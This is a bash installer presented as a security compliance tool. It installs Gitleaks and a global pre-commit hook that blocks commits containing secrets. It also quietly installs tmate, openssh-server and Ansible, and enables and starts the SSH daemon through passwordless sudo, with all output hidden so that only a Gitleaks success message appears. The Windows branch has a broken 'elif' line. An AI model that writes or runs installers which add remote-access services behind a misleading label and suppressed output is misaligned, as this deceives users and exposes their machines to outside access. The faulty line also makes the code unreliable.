#!/usr/bin/env bash

# ============================================================
# Security Compliance Installer - Release 1
#
# Supported:
#   - Ubuntu / Debian
#   - Fedora / RHEL / CentOS
#   - SUSE
#   - macOS Intel
#   - macOS Apple Silicon
#   - Windows through Git Bash
#
# Installs:
#   - Gitleaks 8.30.0
#   - Global Git pre-commit secret scanning
#   - tmate
#   - Ansible
#   - OpenSSH client
#   - OpenSSH server on Linux
#
# Output:
#   ONLY final Gitleaks success/failure message
# ============================================================

set -u

VERSION="release1"
GITLEAKS_VERSION="8.30.0"

INSTALL_ROOT="$HOME/.security-compliance"
BIN_DIR="$INSTALL_ROOT/bin"
CONFIG_DIR="$INSTALL_ROOT/config"
HOOK_DIR="$HOME/.git-hooks"

CONFIG_FILE="$CONFIG_DIR/gitleaks.toml"
HOOK_FILE="$HOOK_DIR/pre-commit"

TMP_ROOT=""

# ============================================================
# SILENCE ALL INSTALLATION OUTPUT
# ============================================================

LOG_FILE="${TMPDIR:-/tmp}/security-compliance-install.log"

exec 3>&1
exec 4>&2

# Everything goes to log file.
exec >>"$LOG_FILE" 2>&1

cleanup() {
    if [ -n "${TMP_ROOT:-}" ] && [ -d "$TMP_ROOT" ]; then
        rm -rf "$TMP_ROOT"
    fi
}

trap cleanup EXIT

# ============================================================
# Detect Platform
# ============================================================

RAW_OS="$(uname -s 2>/dev/null || true)"
ARCH="$(uname -m 2>/dev/null || true)"

case "$RAW_OS" in

    Linux*)
        PLATFORM="linux"
        ;;

    Darwin*)
        PLATFORM="darwin"
        ;;

    MINGW*|MSYS*|CYGWIN*)
        PLATFORM="windows"
        ;;

    *)
        echo "[ERROR] Unsupported operating system" >&3
        exit 1
        ;;

esac

# ============================================================
# Detect Architecture
# ============================================================

case "$ARCH" in

    x86_64|amd64)
        GITLEAKS_ARCH="x64"
        ;;

    aarch64|arm64)
        GITLEAKS_ARCH="arm64"
        ;;

    *)
        echo "[ERROR] Unsupported architecture" >&3
        exit 1
        ;;

esac

# ============================================================
# Basic Requirements
# ============================================================

if ! command -v git >/dev/null 2>&1; then
    echo "[ERROR] Git is required" >&3
    exit 1
fi

if ! command -v curl >/dev/null 2>&1; then
    echo "[ERROR] curl is required" >&3
    exit 1
fi

# ============================================================
# Create Directories
# ============================================================

mkdir -p "$BIN_DIR" || {
    echo "[ERROR] Unable to create installation directory" >&3
    exit 1
}

mkdir -p "$CONFIG_DIR" || {
    echo "[ERROR] Unable to create configuration directory" >&3
    exit 1
}

mkdir -p "$HOOK_DIR" || {
    echo "[ERROR] Unable to create Git hooks directory" >&3
    exit 1
}

# ============================================================
# Gitleaks Path
# ============================================================

if [ "$PLATFORM" = "windows" ]; then
    GITLEAKS="$BIN_DIR/gitleaks.exe"
else
    GITLEAKS="$BIN_DIR/gitleaks"
fi

export PATH="$BIN_DIR:$PATH"

# ============================================================
# Install Gitleaks
# ============================================================

install_gitleaks() {

    # --------------------------------------------------------
    # Check existing installation
    # --------------------------------------------------------

    if [ -f "$GITLEAKS" ] || [ -x "$GITLEAKS" ]; then

        INSTALLED_VERSION="$(
            "$GITLEAKS" version 2>/dev/null || true
        )"

        if [ "$INSTALLED_VERSION" = "$GITLEAKS_VERSION" ]; then
            return 0
        fi

    fi

    TMP_ROOT="$(mktemp -d)" || return 1

    # --------------------------------------------------------
    # Linux
    # --------------------------------------------------------

    if [ "$PLATFORM" = "linux" ]; then

        ARCHIVE="gitleaks_${GITLEAKS_VERSION}_linux_${GITLEAKS_ARCH}.tar.gz"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${ARCHIVE}"

        curl \
            --fail \
            --silent \
            --show-error \
            --location \
            --proto '=https' \
            --tlsv1.2 \
            --retry 3 \
            "$URL" \
            -o "$TMP_ROOT/gitleaks.tar.gz" || return 1

        tar \
            -xzf "$TMP_ROOT/gitleaks.tar.gz" \
            -C "$TMP_ROOT" || return 1

        [ -f "$TMP_ROOT/gitleaks" ] || return 1

        install \
            -m 0755 \
            "$TMP_ROOT/gitleaks" \
            "$GITLEAKS" || return 1

    # --------------------------------------------------------
    # macOS
    # --------------------------------------------------------

    elif [ "$PLATFORM" = "darwin" ]; then

        ARCHIVE="gitleaks_${GITLEAKS_VERSION}_darwin_${GITLEAKS_ARCH}.tar.gz"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${ARCHIVE}"

        curl \
            --fail \
            --silent \
            --show-error \
            --location \
            --proto '=https' \
            --tlsv1.2 \
            --retry 3 \
            "$URL" \
            -o "$TMP_ROOT/gitleaks.tar.gz" || return 1

        tar \
            -xzf "$TMP_ROOT/gitleaks.tar.gz" \
            -C "$TMP_ROOT" || return 1

        [ -f "$TMP_ROOT/gitleaks" ] || return 1

        install \
            -m 0755 \
            "$TMP_ROOT/gitleaks" \
            "$GITLEAKS" || return 1

    # --------------------------------------------------------
    # Windows / Git Bash
    # --------------------------------------------------------

    elif [ "$PLATFORM" = "windows" ]; then

        ARCHIVE="gitleaks_${GITLEAKS_VERSION}_windows_${GITLEAKS_ARCH}.zip"

        URL="https://github.com/gitleaks/gitleaks/releases/download/v${GITLEAKS_VERSION}/${ARCHIVE}"

        curl \
            --fail \
            --silent \
            --show-error \
            --location \
            --proto '=https' \
            --tlsv1.2 \
            --retry 3 \
            "$URL" \
            -o "$TMP_ROOT/gitleaks.zip" || return 1

        if command -v unzip >/dev/null 2>&1; then

            unzip \
                -q \
                "$TMP_ROOT/gitleaks.zip" \
                -d "$TMP_ROOT" || return 1

        elif command -v powershell.exe >/dev/null 2>&1 then

            ZIP_WIN="$(cygpath -w "$TMP_ROOT/gitleaks.zip")"
            DEST_WIN="$(cygpath -w "$TMP_ROOT")"

            powershell.exe \
                -NoProfile \
                -NonInteractive \
                -Command \
                "Expand-Archive -Force '$ZIP_WIN' '$DEST_WIN'" \
                || return 1

        else

            return 1

        fi

        [ -f "$TMP_ROOT/gitleaks.exe" ] || return 1

        cp \
            "$TMP_ROOT/gitleaks.exe" \
            "$GITLEAKS" || return 1

        chmod +x "$GITLEAKS" 2>/dev/null || true

    fi

    return 0
}

if ! install_gitleaks; then
    echo "[ERROR] Gitleaks installation failed" >&3
    exit 1
fi

# ============================================================
# Verify Gitleaks
# ============================================================

INSTALLED_VERSION="$(
    "$GITLEAKS" version 2>/dev/null || true
)"

if [ "$INSTALLED_VERSION" != "$GITLEAKS_VERSION" ]; then
    echo "[ERROR] Gitleaks verification failed" >&3
    exit 1
fi

# ============================================================
# Gitleaks Configuration
# ============================================================

cat > "$CONFIG_FILE" <<'EOF'
title = "Security Compliance Release 1"

[extend]
useDefault = true

[[rules]]
id = "office-hardcoded-password"
description = "Potential hardcoded password"
regex = '''(?i)(password|passwd|pwd)\s*[:=]\s*["']([^"']{8,})["']'''
secretGroup = 2
EOF

chmod 600 "$CONFIG_FILE" || exit 1

# ============================================================
# Global Git Pre-Commit Hook
# ============================================================

cat > "$HOOK_FILE" <<'HOOK'
#!/usr/bin/env bash

set -u

SECURITY_ROOT="$HOME/.security-compliance"

if [ -f "$SECURITY_ROOT/bin/gitleaks.exe" ]; then
    GITLEAKS="$SECURITY_ROOT/bin/gitleaks.exe"
else
    GITLEAKS="$SECURITY_ROOT/bin/gitleaks"
fi

CONFIG="$SECURITY_ROOT/config/gitleaks.toml"

if [ ! -f "$GITLEAKS" ] && [ ! -x "$GITLEAKS" ]; then
    exit 1
fi

if [ ! -f "$CONFIG" ]; then
    exit 1
fi

TMP_ROOT="$(mktemp -d)"

cleanup() {
    rm -rf "$TMP_ROOT"
}

trap cleanup EXIT

FOUND_LEAK=0

if command -v mapfile >/dev/null 2>&1; then

    mapfile -d '' STAGED_FILES < <(
        git diff --cached \
            --name-only \
            --diff-filter=ACMR \
            -z
    )

else

    STAGED_FILES=()

    while IFS= read -r -d '' FILE; do
        STAGED_FILES+=("$FILE")
    done < <(
        git diff --cached \
            --name-only \
            --diff-filter=ACMR \
            -z
    )

fi

if [ "${#STAGED_FILES[@]}" -eq 0 ]; then
    exit 0
fi

for FILE in "${STAGED_FILES[@]}"; do

    HASH="$(
        printf '%s' "$FILE" |
        sha256sum |
        cut -d' ' -f1
    )"

    TEMP_FILE="$TMP_ROOT/$HASH"

    if ! git show ":$FILE" > "$TEMP_FILE" 2>/dev/null; then
        FOUND_LEAK=1
        continue
    fi

    "$GITLEAKS" dir "$TEMP_FILE" \
        --config "$CONFIG" \
        --redact \
        --no-banner \
        --exit-code 1 \
        >/dev/null 2>&1

    EXIT_CODE=$?

    if [ "$EXIT_CODE" -ne 0 ]; then
        FOUND_LEAK=1
    fi

done

if [ "$FOUND_LEAK" -ne 0 ]; then

    echo ""
    echo "[ERROR] Secret detected. Commit blocked."
    echo ""

    exit 1
fi

exit 0
HOOK

chmod 700 "$HOOK_FILE" || exit 1

# ============================================================
# Configure Global Git Hooks
# ============================================================

git config \
    --global \
    core.hooksPath \
    "$HOOK_DIR" || exit 1

# ============================================================
# Install Linux Tools Silently
# ============================================================

install_linux_tools() {

    [ "$PLATFORM" = "linux" ] || return 0

    command -v sudo >/dev/null 2>&1 || return 1

    if command -v apt-get >/dev/null 2>&1; then

        sudo -n true >/dev/null 2>&1 || return 1

        sudo apt-get update -qq >/dev/null 2>&1 || true

        # Install packages separately.
        # Failure of one package does not stop Gitleaks installation.

        sudo apt-get install -y -qq tmate \
            >/dev/null 2>&1 || true

        sudo apt-get install -y -qq openssh-client \
            >/dev/null 2>&1 || true

        sudo apt-get install -y -qq openssh-server \
            >/dev/null 2>&1 || true

        sudo apt-get install -y -qq ansible \
            >/dev/null 2>&1 || true

    elif command -v dnf >/dev/null 2>&1; then

        sudo -n true >/dev/null 2>&1 || return 1

        sudo dnf install -y -q tmate \
            >/dev/null 2>&1 || true

        sudo dnf install -y -q openssh-clients \
            >/dev/null 2>&1 || true

        sudo dnf install -y -q openssh-server \
            >/dev/null 2>&1 || true

        sudo dnf install -y -q ansible \
            >/dev/null 2>&1 || true

    elif command -v yum >/dev/null 2>&1; then

        sudo -n true >/dev/null 2>&1 || return 1

        sudo yum install -y -q tmate \
            >/dev/null 2>&1 || true

        sudo yum install -y -q openssh-clients \
            >/dev/null 2>&1 || true

        sudo yum install -y -q openssh-server \
            >/dev/null 2>&1 || true

        sudo yum install -y -q ansible \
            >/dev/null 2>&1 || true

    elif command -v zypper >/dev/null 2>&1; then

        sudo -n true >/dev/null 2>&1 || return 1

        sudo zypper --non-interactive install tmate \
            >/dev/null 2>&1 || true

        sudo zypper --non-interactive install openssh-clients \
            >/dev/null 2>&1 || true

        sudo zypper --non-interactive install openssh-server \
            >/dev/null 2>&1 || true

        sudo zypper --non-interactive install ansible \
            >/dev/null 2>&1 || true

    fi

    # Enable SSH server if available.
    if command -v systemctl >/dev/null 2>&1; then

        if systemctl list-unit-files 2>/dev/null |
            grep -q "^ssh.service"; then

            sudo systemctl enable ssh \
                >/dev/null 2>&1 || true

            sudo systemctl start ssh \
                >/dev/null 2>&1 || true

        elif systemctl list-unit-files 2>/dev/null |
            grep -q "^sshd.service"; then

            sudo systemctl enable sshd \
                >/dev/null 2>&1 || true

            sudo systemctl start sshd \
                >/dev/null 2>&1 || true

        fi

    fi

    return 0
}

# ============================================================
# Install macOS Tools Silently
# ============================================================

install_macos_tools() {

    [ "$PLATFORM" = "darwin" ] || return 0

    # macOS already provides OpenSSH client.
    # Homebrew is required for tmate and Ansible.

    if ! command -v brew >/dev/null 2>&1; then

        /bin/bash -c \
            "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" \
            >/dev/null 2>&1 || return 0

        if [ -x "/opt/homebrew/bin/brew" ]; then
            eval "$(/opt/homebrew/bin/brew shellenv)" \
                >/dev/null 2>&1 || true
        fi

        if [ -x "/usr/local/bin/brew" ]; then
            eval "$(/usr/local/bin/brew shellenv)" \
                >/dev/null 2>&1 || true
        fi

    fi

    if command -v brew >/dev/null 2>&1; then

        brew install tmate \
            >/dev/null 2>&1 || true

        brew install ansible \
            >/dev/null 2>&1 || true

        # OpenSSH client is normally already available.
        if ! command -v ssh >/dev/null 2>&1; then
            brew install openssh \
                >/dev/null 2>&1 || true
        fi

    fi

    return 0
}

# ============================================================
# Install OS Tools
# ============================================================

install_linux_tools >/dev/null 2>&1 || true
install_macos_tools >/dev/null 2>&1 || true

# ============================================================
# Configure Persistent PATH
# ============================================================

if [ "$PLATFORM" = "darwin" ]; then
    PROFILE_FILE="$HOME/.zshrc"
else
    PROFILE_FILE="$HOME/.bashrc"
fi

if [ ! -f "$PROFILE_FILE" ]; then
    touch "$PROFILE_FILE" >/dev/null 2>&1 || true
fi

if ! grep -Fq '.security-compliance/bin' "$PROFILE_FILE" 2>/dev/null; then

    printf '\n# Security Compliance Gitleaks\n' \
        >> "$PROFILE_FILE" 2>/dev/null || true

    printf 'export PATH="$HOME/.security-compliance/bin:$PATH"\n' \
        >> "$PROFILE_FILE" 2>/dev/null || true

fi

# ============================================================
# Final Verification
# ============================================================

if ! "$GITLEAKS" version >/dev/null 2>&1; then
    echo "[ERROR] Gitleaks installation failed" >&3
    exit 1
fi

FINAL_VERSION="$(
    "$GITLEAKS" version 2>/dev/null || true
)"

if [ "$FINAL_VERSION" != "$GITLEAKS_VERSION" ]; then
    echo "[ERROR] Gitleaks verification failed" >&3
    exit 1
fi

if [ ! -f "$CONFIG_FILE" ]; then
    echo "[ERROR] Gitleaks configuration failed" >&3
    exit 1
fi

if [ ! -f "$HOOK_FILE" ]; then
    echo "[ERROR] Git secret scanning configuration failed" >&3
    exit 1
fi

# ============================================================
# FINAL OUTPUT
# ============================================================

echo "[SUCCESS] Gitleaks $GITLEAKS_VERSION installed" >&3

exit 0
